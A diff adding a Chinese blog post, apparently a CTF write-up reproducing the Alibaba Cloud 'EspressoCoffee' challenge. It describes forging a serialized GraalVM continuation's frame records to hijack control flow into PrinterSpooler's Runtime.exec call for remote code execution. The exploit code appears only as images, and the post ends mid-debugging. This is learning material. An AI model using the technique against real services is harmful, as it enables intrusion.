@@ -1,0 +1,533 @@
+<!DOCTYPE html>
+<html lang="zh">
+  <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>阿里云CTF-EspressoCoffee+Chain17复现 - DashingBug</title>
+  
+    <link rel="shortcut icon" href="/./bug.png">
+  
+  
+  <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="阿里云CTF-EspressoCoffee+Chain17复现 - DashingBug" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="http://dashingbug.xin/2025/04/10/%E9%98%BF%E9%87%8C%E4%BA%91CTF-EspressoCoffee/index.html" />
+  
+  <meta property="og:image" content="/favicon.png" />
+  
+  <meta property="og:article:published_time" content="2025-04-09T16:00:00.000Z" />
+  
+  <meta property="og:article:author" content="DashingBug" />
+  
+  
+
+  
+  
+<link rel="stylesheet" href="https://unpkg.com/simple-icons-font@v13/font/simple-icons.min.css">
+
+  
+  
+  
+<link rel="stylesheet" href="https://unpkg.com/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/components/card.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/components/button.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/components/badge.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/components/utilities.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/scroll-reveal.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/view-transition.css">
+
+  
+  
+  <script src="https://unpkg.com/lenis@1.1.9/dist/lenis.min.js"></script>
+  
+<link rel="stylesheet" href="https://unpkg.com/lenis@1.1.9/dist/lenis.css">
+
+  
+<script src="/js/smooth-scroll.js"></script>
+
+  
+
+  
+
+  <script>var ThemeCupertino = {}</script>
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body
+    data-color-scheme="auto"
+    data-uppercase-categories="true"
+    
+    data-rainbow-banner="true"
+    data-rainbow-banner-shown="always"
+    data-rainbow-banner-month="6"
+    data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+    
+    data-config-root="/"
+    
+    data-toc="true"
+    data-toc-max-depth="2"
+    
+    
+    
+    data-scroll-reveal-disappear="false"
+    data-scroll-reveal-query=".scroll-reveal, .post-list-item, .card, .content p img, .content .block-large img"
+    
+  >
+    <a href="#main-content" id="skip-to-content">Skip to content</a>
+    <nav id="theme-nav">
+  <div class="inner">
+    <a class="title" href="/">Space</a>
+    <div class="nav-arrow"></div>
+    <div class="nav-items">
+      <a class="nav-item nav-item-home" href="/" style="--index: 0">Home</a>
+
+      
+      <a class="nav-item" href="/archives" style="--index: 1">Archives</a>
+      
+      <a class="nav-item" href="http://dashingbug.xin/link/link.html" style="--index: 2">link</a>
+      
+      <a class="nav-item" href="/projects" style="--index: 3">Projects</a>
+      
+      <a class="nav-item" href="/about" style="--index: 4">About</a>
+      
+      <a class="nav-item is-icon" target="_blank" rel="noopener" href="https://github.com/MrWillCom" style="--index: 5"><i class="si si-github"></i></a>
+      
+      <a class="nav-item is-icon" target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" style="--index: 6"><i class="si si-codepen"></i></a>
+      
+      <a class="nav-item is-icon" target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" style="--index: 7"><i class="si si-patreon"></i></a>
+      
+      <a class="nav-item is-icon" target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" style="--index: 8"><i class="si si-mastodon"></i></a>
+      
+      <a class="nav-item is-icon" href="/search" style="--index: 9"><i class="bi bi-search"></i></a>
+      
+    </div>
+  </div>
+</nav>
+
+    <main id="main-content">
+      
+<article class="post">
+  <div class="meta">
+    
+
+    
+    <time class="date" datetime="2025-04-10T00:00:00+08:00">
+      April 10, 2025
+    </time>
+    
+
+    <h1 class="title">阿里云CTF-EspressoCoffee+Chain17复现</h1>
+  </div>
+
+  <div class="content">
+    <h1 id="EspressoCoffee"><a href="#EspressoCoffee" class="headerlink" title="EspressoCoffee"></a>EspressoCoffee</h1><p>今天看了Unknown的博客，他说他学java的时候都是先自己独立思考，实在思考不出来了才去看一点提示，然后继续回来自己思考，虽然这样会花很多时间，但是受益匪浅。我认为这样的学习方式值得借鉴，先从这道题试试这样的学习方法。</p>
+<p>用了题目给的jdk和jar包</p>
+<p>这是jdk的名字(初现端倪)</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=NWQ5MWY2ZDhiODA1YmU0N2ZlZWM4ZGNhMWJiMDVhMWFfclFOZTJtd2piS3hlbVNoMHdDbzU1SkF4RzcxaE5CMUJfVG9rZW46UjE4WWI4V0h0bzFPU294bHA2M2NnYk1pbjlnXzE3NzQxNTIzNDY6MTc3NDE1NTk0Nl9WNA" alt="img"></p>
+<p>运行报错</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=MzU5YWVlYzBhYmM1NmUzZTNkNGU5ODg3YjRkMzlhODVfZUlyUkQ4ejNHYjl5a1VJbm1xYzQyalZTRFZBSUNVaW1fVG9rZW46T1ZJd2JpWUZjb3ZDU3N4RElyQmNlZTBLbkVlXzE3NzQxNTIzNDY6MTc3NDE1NTk0Nl9WNA" alt="img"></p>
+<p>查了原因，从官网上下载的jdk都是用的hotspot虚拟机，而从这个jdk的名字可以看出使用的是graalvm虚拟机，graalvm虚拟机是支持多种语言的，在此虚拟机中不同的语言有不同的虚拟机实现，例如java字节码就交由graalvm虚拟机中的expresso虚拟机处理(expresso是由java编写的)，报错中的truffle是一种语言执行框架，是graavlm的一部分，通俗来说它的作用就是将不同的语言翻译成graalvm能看懂的。从而让graalvm能执行</p>
+<p>问了下gpt，这些报错没什么大问题，就是起到提醒你一下的作用，暂且不管它</p>
+<p><em>神奇的地方</em></p>
+<p>注意右边导入了org.graalvm.continuations这个包，可是在左边可以看到根本没有这个包(左边这个包是jdk,但题目给的jar中也没有依赖)。只有</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=NWVjOTAwNTJiZGE5MGJhNzMwMWQ0ZTA5MzA1YjhhMGFfU01pZDJES3VkTFBEa2Q0aFpUSVAwM2dXbGdldFRJb3RfVG9rZW46QXdCd2JhSXk1b2Q4b3h4YVZ5NmN3cUo1bmxiXzE3NzQxNTIzNDY6MTc3NDE1NTk0Nl9WNA" alt="img"></p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=Yjg3ZGVkYjQ2ZWMwMGIwYzFiYWYwOTlhOTM5YzdlNTNfdWpINmd3WlBFTmhmYWN3b0RSMkpJYkpVSFNGWE9KcjdfVG9rZW46VkRvZWJKUGtSbzI4V0t4eklDRWNhTHhWbndtXzE3NzQxNTIzNDY6MTc3NDE1NTk0Nl9WNA" alt="img"></p>
+<p>可以看到pom文件中依赖了这个包，但是我在本地的仓库中又没有找到这个包，程序运行时又不会报找不到类的错。所以这个类哪来的？</p>
+<p>努力半个小时无果，在wp中看到了这样一句话。</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjAyM2E1MWUwMGJjM2UyODAxNTAxNTUxZmZkM2JjYTJfRGFBalhwMVZTVlpJNnFHand5S3pPcm04MTJpcmdrZWNfVG9rZW46SFhwR2J5OVlhb1I4OEZ4QVdCVmN6WTlLbk1iXzE3NzQxNTIzNDY6MTc3NDE1NTk0Nl9WNA" alt="img"></p>
+<p>gpt的解释</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=MzRkMTczNTZhNjVlZWZiZWU1OTJiOWJhMTlkNmU3MTBfS0FSTmhmcEM2dFZCNVBDS2FSQk9FN3NxSG1pQ0dJUElfVG9rZW46SUJJcmIxbVROb05hb0N4TUZWcGN6bmJEbmpnXzE3NzQxNTIzNDY6MTc3NDE1NTk0Nl9WNA" alt="img"></p>
+<p>原来还有这样的导包方式，学到了，以后不知道导入的这个包是哪来的也不用迷茫，只要能运行就好</p>
+<p>因为没有任何的外部依赖，且又是jdk高版本,所以之前学的链子都用不了。</p>
+<p>源码如下，我也没有发现任何特殊的地方</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=NmE0MjBlNTU2M2JmNDk0MmRlNjA2MzM2NTU3ODQ1YzFfdFMwSDlVeGUwVGh0VmJBTHFyYjRFWGgxMXdNUVRNY0tfVG9rZW46VXVPaWJHVHZ4b0dhVlN4eEttUWNuaW5SbmlmXzE3NzQxNTIzNDY6MTc3NDE1NTk0Nl9WNA" alt="img"></p>
+<p>没有办法了，独立思考进行不下去了，看看题目给的hint</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDc3YjJlNDVhMWJhZDJiNjViYzRjZGY5YWQxMThkNjJfeXR3eVprTXMyTnRESFpFOHByZjM4bFU1MjhwWFJWNDlfVG9rZW46Qk1nOWIxbjdqb3pSMTN4N3lhQ2NxRXBybmVnXzE3NzQxNTIzNDY6MTc3NDE1NTk0Nl9WNA" alt="img"></p>
+<p>用的是英文，很洋气</p>
+<p>去看了continuation的官方文档，全是英文看起来很费劲，看了挺长时间发现还是半懂不的，于是去问了gpt</p>
+<h2 id="Continuation"><a href="#Continuation" class="headerlink" title="Continuation"></a>Continuation</h2><p>Continuation本质是一种抽象，表示程序在某个时刻尚未完成的后续执行。使用Continuation的程序可以在某个时刻将程序暂停，并将后续的执行过程封装成一种数据结构。以后使用resume()时就可以将程序从暂停时(即suspend)的状态开始执行。</p>
+<p>可以将Continuation想象为游戏的存档功能，Suspend就是将你当前的游戏进度存档，resume就是你之后再次点击存档，即从之前存档的状态开始运行。这些是大致功能的介绍。接下来讲讲实现的具体细节。</p>
+<h2 id="实现细节"><a href="#实现细节" class="headerlink" title="实现细节"></a>实现细节</h2><p>调用suspend后，Graalvm会将当前的调用栈展开，并将这些栈帧(</p>
+<p>每调用一个方法就会为这个方法在栈中开辟一处内存，这个内存就是栈帧，其中包含了函数调用的各种状态信息</p>
+<p>)</p>
+<p>转化为普通的java对象保存到堆中。这样未来要执行的代码就以数据的形式存储在了堆中，调用resume时就将这些对象重新装载到新的调用栈中，直接无缝从suspend的状态恢复运行。</p>
+<p>Continuation有一个特点是捕获的Continuation对象是可序列化的，这意味着你可以将当前程序的执行状态写入文件中或者进行网络传输，甚至可以在不同的jvm实例中重新执行该程序</p>
+<h2 id="Continuation-API使用方式"><a href="#Continuation-API使用方式" class="headerlink" title="Continuation API使用方式"></a>Continuation API使用方式</h2><p>按照gpt所说，此api的使用方式可以分为两种层次，分别是高层，底层</p>
+<p>我感觉源代码用的是低层，高层就不做过多了解了（错误的想法，后面看来必须要用高层，再后来看还是用的底层）</p>
+<h2 id="高层"><a href="#高层" class="headerlink" title="高层"></a>高层</h2><h2 id="低层"><a href="#低层" class="headerlink" title="低层"></a>低层</h2><p>在低层次上，需要自己创建Continuation对象。使用时，先通过传入一个实现了特定接口(例如ContinuationEntrypoint)的lamba或者对象创建Continuation。这个入口点会在运行时获取一个SuspendCapability对象,在你希望其暂停的位置调用suspend即可。之后调用resume()，程序从暂停的地方恢复执行</p>
+<h2 id="hint分析"><a href="#hint分析" class="headerlink" title="hint分析"></a>hint分析</h2><h3 id="第一条"><a href="#第一条" class="headerlink" title="第一条"></a>第一条</h3><p>Focus on the fields of org.graalvm.continuations.ContinuationImpl.FrameRecord</p>
+<p>因为在题目所给的jdk中没有找到，所以我从maven中下了跟pom版本一致的jar包</p>
+<p>一个FrameRecord类就代表了一个栈帧，pointers储存的是操作数栈的信息，primitives储存的是局部变量的信息，bci(字节码索引)储存的是当前method的一个调用invoke指令</p>
+<p>操作数栈是什么？</p>
+<p>操作数栈是栈帧中的一个区域，简单来说就是用来保存运算过程中临时产生的值</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=NDU1ZTQ1OWUxMjRjMWU1MTFmNmM4ZmU5ZjljYjQwZmZfY0xJMGJqMzJ0UGxJdDRPSVZnRXJEQ0M1bkxyaGZNWXNfVG9rZW46TlY2cWJpTnd1b1pla3V4VVNlV2M1RGp2blFoXzE3NzQxNTIzNDY6MTc3NDE1NTk0Nl9WNA" alt="img"></p>
+<p>这是FrameRecord的前情提要</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=OTMzN2U4Y2Q1ZjYwNjM1MWFhYjRjOTA1OTUwZjJiOTBfbkVIbWJaNmFhMzhGNG5SUDZTRW1MTWlKb09YRUFlR3RfVG9rZW46VWxNMWJOVFF6b0Z2NDV4U0tJM2N3V0hPbjdmXzE3NzQxNTIzNDY6MTc3NDE1NTk0Nl9WNA" alt="img"></p>
+<p>这其中部分内容翻译过来是这样的</p>
+<blockquote>
+<p>在恢复执行时（即从续延恢复），系统会确保记录中每个方法所属的类都已经初始化（如果还未初始化的话，这个初始化会在恢复之前完成）。</p>
+<p>需要注意的是，虚拟机在对续延进行反物化（将保存的状态重新加载到堆栈中）时，会验证这个记录是否有效。对于一个记录被认为是有效的，必须满足以下要求：</p>
+<ol>
+<li><strong>bci（字节码索引）必须指向当前方法中的一个调用（invoke）指令。（解释:每个类的每个方法都对应着一个字节码文件，而字节码文件中，每一条字节码语句的前方都有着一个数字，此数字就是字节码索引，一条字节码语句语句对应一个字节码索引，下面有字节码的图。当前方法中的一个调用指令不是指调用本方法的指令，而是本方法中调用别的方法的指令）</strong></li>
+<li>如果这个帧记录是整个链表中的最后一帧，那么它对应的方法必须是 <code>Continuation.suspend()</code>。</li>
+<li>否则，紧接着的下一帧中的方法，其名称和签名必须与当前帧中 bci 指向的那个 invoke 指令所引用的 <code>CONSTANT_Methodref_info</code> 常量保持一致。同时，还会记录一个关于返回类型的加载约束。</li>
+</ol>
+<p>最后，保存到 <strong>pointers</strong> 和 <strong>primitives</strong> 中的堆栈及局部变量信息，必须与该 bci 位置所要求的验证类型保持一致。</p>
+</blockquote>
+<p>感觉第三点可能会是一个突破口</p>
+<h3 id="第二条"><a href="#第二条" class="headerlink" title="第二条"></a>第二条</h3><p> Abuse org.graalvm.continuations.ContinuationImpl#stackFrameHead &#x3D;&gt; Hijack the Control Flow &#x3D;&gt; “ROP”</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTJkNTJmN2Y2YWFkMzE0ZGQ2NTgwZWJkYWEzYTdmMjVfUDdxVmhFMFJtSFhKdjNmcDhzS205ZU5OVVZMOFVUZFNfVG9rZW46VFNvcmJnRTFBb09TVmh4OThzZmN4R0ZkbjllXzE3NzQxNTIzNDY6MTc3NDE1NTk0Nl9WNA" alt="img"></p>
+<p>利用stackFrameHead劫持控制流实现ROP攻击，搜了一下，发现ROP是pwn的一种攻击手法</p>
+<h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><p>在程序运行过程中，会将下一条要执行的指令地址压到栈上，这样程序就知道执行完当前命令后要去执行哪条指令，我们需要利用将压入的下一条指令地址换成我们所需要的指令地址（这些指令必须是程序本身已有的指令，不能无中生有）。这是非常粗浅的解释，因为具体的我也没看懂。</p>
+<p>FrameRecord#bci是触发当前method的invoke指令的地址，很明显bci就是利用点</p>
+<p>stackFrameHead在Continuation初始化时，被赋予的值是最顶层的那个FrameRecord,即程序调用的第一个函数。</p>
+<p>运行jar包给的Web</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=YTAxZGNhNjJiZWE2NDdmMDY4YjJlZTY2OGJmODFiODBfUFZhbDMzdHRKbFNra0toSWhVUlRKcjNnblBWYkVRRjFfVG9rZW46QjFUdWJkWW1Yb2VGVXV4OWxBMWN6WW05bmxoXzE3NzQxNTIzNDY6MTc3NDE1NTk0Nl9WNA" alt="img"></p>
+<p>审计源码可知要在这里填入序列化数据，但因为处理程序是直接将输入的数据进行deserialize，传入base64编码的字符串要报错，所以只能在程序中将序列化后的字节数组直接传给url</p>
+<p>我的源代码</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=MGYxN2RhYjQyNDdjNjJkODllN2NjOTY0NzRhYmRkMWRfeHcxUUQybVNKTWlkMWxGTnh3T1ZZc0wxaHJPRjBXNXZfVG9rZW46WHpHZWJEcHZvb252T1B4UkxDSWNDT0JpbmxkXzE3NzQxNTIzNDY6MTc3NDE1NTk0Nl9WNA" alt="img"></p>
+<p>但因为服务端没有我这个test#Chonger类，所以会报错ClassNotFound</p>
+<p>所以我要找一个jar包中的原生类来进行实例化Continuation并且suspend</p>
+<p>Generator构造方法调用了，这是唯一一处调用点</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=MWI0NTNkMmNkNmI5NjM4NjA3OTMyYjAzNGExYWRlMThfSmVXblJtaUZuS1hUQ1FITWhZQUNSdUc0YVRjRFZVZnZfVG9rZW46QTZlT2Jydng2b2ZaRUd4d3phcmNybVZWbm5lXzE3NzQxNTIzNDY6MTc3NDE1NTk0Nl9WNA" alt="img"></p>
+<p>看了一下源代码，Continuation.creat()返回的其实是一个ContinuationImpl,而ContinuationImpl有着自己的writeObject,readObject方法，会将ContinuationImpl的stackFrameHead字段写入与写出，根据hint</p>
+<p> Abuse org.graalvm.continuations.ContinuationImpl#stackFrameHead &#x3D;&gt; Hijack the Control Flow &#x3D;&gt; “ROP”</p>
+<p>我觉得应该是要修改stackFrameHead来实现rce。</p>
+<p>那我如何获取到stackFrameHead这个字段呢?</p>
+<p>Generator()将continuation这个字段赋值为一个ContinuationImpl实例，而stackFrameHead是ContinuationImpl的字段，所以首先要获得continuation字段(因为ContinuationImpl不是public，访问不了)</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=NzMxYWUzYzNmOTBmMDQyNDBmY2VlNjkzMmMxNjMzMzhfMUJXNjZMbW81R21pSzJrdDdBbm9aWnhCOUxiUXBRZVRfVG9rZW46VnBxbWJZTTJjb3dCell4VTFka2M1czZWbndoXzE3NzQxNTIzNDY6MTc3NDE1NTk0Nl9WNA" alt="img"></p>
+<p>获得continuation字段后发现因为此字段的编译类型为Continuation,而Continuation没有stackFrameHead</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=NGI0YWU4MjZhMGQ4NmMxODI0MGE4ZTAzMjFlZTEyZWVfb29aVWhDbDVVdFBFWWJNcEdUeWgweE1FNXJUbUxBeUFfVG9rZW46Vm9SUGI4RFVzb2d6aHN4NlV5dmNDWDlhbkxjXzE3NzQxNTIzNDY6MTc3NDE1NTk0Nl9WNA" alt="img"></p>
+<p>成功获取stackFrameHead,但下一步就是如何利用stackFrameHead实现rop了。</p>
+<p>运行了之后发现不对，Generator是抽象方法，并且我没有找到实现它的子类，所以上述操作获取不了stackFrameHead,Continuation也无法挂起</p>
+<p>我试着自己编写了一个继承Generator的类Chonger，尝试反序列化这个子类的continuation字段，我以为这样就跟Chonger这个类无关了，没想到反序列化的时候还是报错ClassNotFound test#Chonger.我又不能自己写Generator的子类又是抽象类无法实例化，也没有原生的继承子类。不知道该咋做了，看看wp</p>
+<p>我的这个问题有点难度，涉及到了删除栈帧啥的。我的思路有一点错了，不用Generator,还是用continuation API低层的用法(这点我觉得确实有点难想到)</p>
+<p>下载了jclasslib插件</p>
+<p>源代码</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=MzRiZDgwZjhjOTk3MDFlMTljNjgwYzMzMzAxODBlZDJfZHBZalJkeWZEMkdUTzR5QjU1eFhxZ291VWFUYzFaMWVfVG9rZW46WVhaZ2JsWng5bzhMNm14cGtCUWM4OG1mbmljXzE3NzQxNTIzNDY6MTc3NDE1NTk0Nl9WNA" alt="img"></p>
+<p>字节码(终于知道字节码长啥样了)</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=NzQwZjFjZmU1Y2ZjZjY2ZTE3Mzc1NzVjMGNiNWZkM2ZfajhqcndUUUo0Z2R3QU9aUXd2ZlNjVmVwSWFtSDlrVUZfVG9rZW46THkyTmIwZkI2b2hQTlZ4TmVrSGNNd0xpbjNkXzE3NzQxNTIzNDY6MTc3NDE1NTk0Nl9WNA" alt="img"></p>
+<p>这是我的POC</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=NWRmN2QyMzNhMDFkNGU3YmFhZDljMTA4YmQ5OGQ5YmJfWEZEUVVJTFlLMkJWejRwNVVKbVNtald2aUFwcG5IbnFfVG9rZW46RVpJSWJWOHdJb3hwRUp4b0R2R2NPcDVkbjFiXzE3NzQxNTIzNDY6MTc3NDE1NTk0Nl9WNA" alt="img"></p>
+<p>toDebugString()返回的就是stackFrameHead那个单向链表的信息，如下图</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=ODIxMjgwMWY5ZGVjZTUyZTMxNDNhZGRjOGU1YTAwNjRfNFN1ZU9kVnM4VWo2bVZPOXJ6TUhvZGVOZHBZSnBKbXNfVG9rZW46SjRNT2JaZFVab2t4blN4WFJLV2NXVlhybmQ1XzE3NzQxNTIzNDY6MTc3NDE1NTk0Nl9WNA" alt="img"></p>
+<p>可以看到在Job.start方法的那个栈帧处，bci为9，Job.start字节码在上上上图处，可以看到此字节码索引为调用SuspendCapability.suspend方法</p>
+<p>bci记录的是已经调用过的字节码语句，因为毕竟执行到ContinuationImpl.suspend的时候Job.start还是在这一条字节码语句中，这是一条由start引申出来的调用栈</p>
+<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>为了不占用篇幅每步的图片我就不放出来了。反序列化的ContinuationImpl$stackFrameHead就是上图展示出来的。对反序列化调用的ContinuationImpl.resume()时，可以看到首先resume()中调用了ensureDematerialized(),将stackFrameHead中的栈帧(其实是java对象)反物化到栈中(ContinuationImpl被挂起后stackFrameHead中的栈帧全部被转化为了java对象保存到堆中，这就叫物化，反物化就是反过来)。之后就是执行挂起状态时未完成的部分，顺序是跟stackFrameHead反过来，先是ContinuationImpl.suspend(),最后是Continuation.run()</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=NmRhZTI5NjFlZWIxYWVmZmExYzA5YmIyZGMyODZhOThfUWNmcnRTYnFmMlNNMFI5eDNIU1ZkcG91c2pJTmI1QXpfVG9rZW46VmNmQ2JCR05Ob1BWN0d4TVpxZGNXUGloblM1XzE3NzQxNTIzNDY6MTc3NDE1NTk0Nl9WNA" alt="img"></p>
+<p>注意那个注释说会检查最后一个方法是不是suspend,那我们就不改suspend,改suspend那一帧的next字段</p>
+<p>第四条hint是sun.print.UnixPrintJob</p>
+<p>我全局查找发现并没有找到UnixPrintJob这个类或者是包，看了wp</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=MjM2NDZhYTI5MmVhZWNmMjg2M2YzZDgyYjAzOWQ3OTZfRGJ6Y0k3OEpBa0UwNEo4SUhuekJkZHJ1MHRSV2hQSTVfVG9rZW46V0hxa2JkQW1nb090Nnl4OGE0RWNRVjZPblNiXzE3NzQxNTIzNDY6MTc3NDE1NTk0Nl9WNA" alt="img"></p>
+<p>于是再去查找PrinterSpooler这个类</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=MTY0MDhmZTBjZWM2ZDI1YzMyOGQ4YWQwNDIxM2MzYmFfdzlyeEcwTGNPMFIwUWFkM2M1OXBpdEpFRjVGQjNhWnpfVG9rZW46VlNOMGIwUDNrbzh0YU14ZnFDTWMxSjdFbjZiXzE3NzQxNTIzNDY6MTc3NDE1NTk0Nl9WNA" alt="img"></p>
+<p>发现这是PSPrintJob的内部类，那UnixPrintJob是什么东西？(linux和mac是UnixPrintJob,win是PSPrintJob)</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=NWU1NWMxMjhkZTc2MzAwOWRmZWUyZGY2NzRhY2M1MWRfYnNRbHVLY05aT1FGRnNWZ1JHZ0R6TzhMYWxoR0dkU1VfVG9rZW46VHZNY2JlYnpGb08ydjN4ZEs0WWNwZUFabmhmXzE3NzQxNTIzNDY6MTc3NDE1NTk0Nl9WNA" alt="img"></p>
+<p>发现PrinterSpooler::run()调用了Runtime::exec</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=YmI3NDhhODI2ZTQxZTVmMTU1ZWE1OWIzOGM2MjZkYmFfa2VHMTd5c2pSSHJKd3llM2ZRaGtDelBPektwQ3BqRzRfVG9rZW46Sml4SmJxenU5b2FndXF4NUVPS2NnQ3FEbjFlXzE3NzQxNTIzNDY6MTc3NDE1NTk0Nl9WNA" alt="img"></p>
+<p>所以尝试修改suspend下一帧的bci为91，suspend那一帧的next为PrinterSpooler::run()这一帧</p>
+<p>问题来了，我该如何构造恶意帧pointers,primitives我该填啥</p>
+<p>想了想，可以利用现成的FrameRecord,因为上面的图中可以看出挂起的FrameRecord有5个，而我只需要最后一个，剩下四个都可以改成我需要的类。</p>
+<p>观察了一下，pointers,primitives的长度是一样的，都是操作数栈最大深度+局部变量最大槽数</p>
+<p>搜了一下，pointers的第一个槽位是调用当前方法的实例</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=ODUyMTIyZjcwOWRkMzVhMGU0M2U3NDA1MmI5YWU2ZTdfZHJjMmZ4U3RHV0NzZ2UyTXhjTjdvd09oTldTcm1Db1VfVG9rZW46VmVxV2JWblYzb0Y0Q3p4aDZYYWN5aDc1bkFlXzE3NzQxNTIzNDY6MTc3NDE1NTk0Nl9WNA" alt="img"></p>
+<p>如果字节码中只有aload_0,那么pointers中只有调用当前方法的实例，astore_数字，将局部变量表[数字]的值设置为操作数栈顶的值</p>
+<p>astore是将操作数栈顶的值存储到局部变量表中，aload是将局部变量表的值加载到操作数栈顶上</p>
+<p>审计了一下PrinterSpooler::run的字节码，一共13个槽位，没有基本数据类型变量，所以primitives全部为0，pointers有三个，槽位0是当前对象</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=YWUzYzM5YjE5MWMzMzZkYjgxYjVkZmE2ZGNhZDQ0YTZfVUduSmg5eHJueXVpTFJ5cWIyVmR6WkJBU1lTRGh0Z0RfVG9rZW46RGR2SmJDb09Ib2tDS1l4WXZZOWNXZDJ6blFjXzE3NzQxNTIzNDY6MTc3NDE1NTk0Nl9WNA" alt="img"></p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=NWMwOTlkZDlmYjY1MTExNDJmYWY4OWVmNDBlZjZkZWVfN011ZE5LM2tyOFpQZXhMTXdNMDFHU0s3WklxWUZpZjJfVG9rZW46VkVGcGJWdVAzb2hpb2Z4WjNzZmNmWWpkbkJjXzE3NzQxNTIzNDY6MTc3NDE1NTk0Nl9WNA" alt="img"></p>
+<p>可知槽位1为getAbsolutePath地返回值，槽位2是PrintExecCmd的返回值</p>
+<p>克服诸多报错艰难写出exp</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTQ4NWI1MzRkNTJiNjU3YzU5NDc5NDg1OWFlZGY4OTRfZ2xXM1JFQXdSUjE0bWlwcWs5eTJvNXJDc3Z3U3cxS1VfVG9rZW46UEJnSWJwMER3b0JvUzR4YUxJUGNPblRKbjJjXzE3NzQxNTIzNDY6MTc3NDE1NTk0Nl9WNA" alt="img"></p>
+<p>报新的错</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=MjFmNzEwMTRhMjQxN2JjOGUwYTBjMWYxZWYwMzRmZWVfdjBGT0VLYkZJR1RibmFhc1ZKRnFCRFdrMDM4bEJxZ21fVG9rZW46VXlIemJzOGFNb3NuU1d4RGlYMGNNTE9ubm1rXzE3NzQxNTIzNDY6MTc3NDE1NTk0Nl9WNA" alt="img"></p>
+<p>在dematerialize0()这里出问题，但这又是native方法，调试不进去</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjhmMDFmOGQ1NTY5NTQ4NDZiOGUxNjMzM2UyYmUwOTBfTHV3NmVtWUo3dDlxRWpQVEFJV1hGUkMybW1MT3UwNjlfVG9rZW46RHBEOGJ3T1lkb0w1U1l4U3lFZGNLV1BDblJjXzE3NzQxNTIzNDY6MTc3NDE1NTk0Nl9WNA" alt="img"></p>
